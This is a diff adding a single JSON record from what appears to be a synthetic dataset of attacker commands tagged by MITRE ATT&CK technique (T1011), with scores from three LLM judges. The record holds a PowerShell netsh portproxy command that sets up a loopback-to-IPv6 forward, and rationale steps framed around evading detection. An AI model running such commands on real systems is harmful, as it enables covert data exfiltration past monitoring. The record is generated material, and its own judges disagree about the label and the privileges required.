@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1011",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "netsh interface portproxy add v4tov6 listenaddress=127.0.0.1 listenport=49171 connectaddress=2001:db8:ac:1::beef connectport=49172",
+  "explanation": "Sets a v4-to-v6 port proxy from localhost to a remote IPv6 address on uncommon ports, allowing tools to exfiltrate over an IPv6 medium via a loopback entry point (T1011).",
+  "rationale_steps": [
+    "Expose a localhost IPv4 port that forwards to an IPv6 destination.",
+    "Use high, uncommon ports (49171/49172) to minimize detection.",
+    "Enable applications restricted to IPv4 to send data over IPv6 as an alternate channel."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1011-9788b456-eb5b681e",
+  "source_prompt_hash": "9788b456",
+  "timestamp_utc": "2025-09-30T08:11:11.119466Z",
+  "validation": {
+    "syntax_ok": true,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Valid netsh portproxy v4tov6 syntax with correctly formatted parameters, addresses, and ports, no quoting or parsing issues.",
+        "semantic_score": 3,
+        "semantic_justification": "It will set up the intended IPv4-to-IPv6 localhost proxy enabling potential data forwarding, but it requires administrative privileges (not none) and aligns more with proxy/tunneling than T1011's 'other network medium' exfiltration.",
+        "combined_score": 4.0,
+        "confidence": 0.8,
+        "timestamp": "2025-10-01T01:14:08.044596Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with correct syntax for the netsh interface portproxy command, using valid parameters and proper value assignments.",
+        "semantic_score": 5,
+        "semantic_justification": "The command correctly implements the T1011 technique by establishing a port proxy from IPv4 to IPv6 that could be used to exfiltrate data over an alternative network medium (IPv6) while evading IPv4 monitoring.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T01:14:13.243536Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with valid syntax, flags, and values for the `netsh interface portproxy` context.",
+        "semantic_score": 1,
+        "semantic_justification": "The command requires administrative privileges to execute successfully, contradicting the stated 'Privilege: None' and preventing it from achieving the claimed intent of setting a port proxy.",
+        "combined_score": 3.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T06:26:55.857971Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 3.0,
+    "llm_average_score": 4.0,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null,
+    "Syntax_Run_Details": ""
+  }
+}
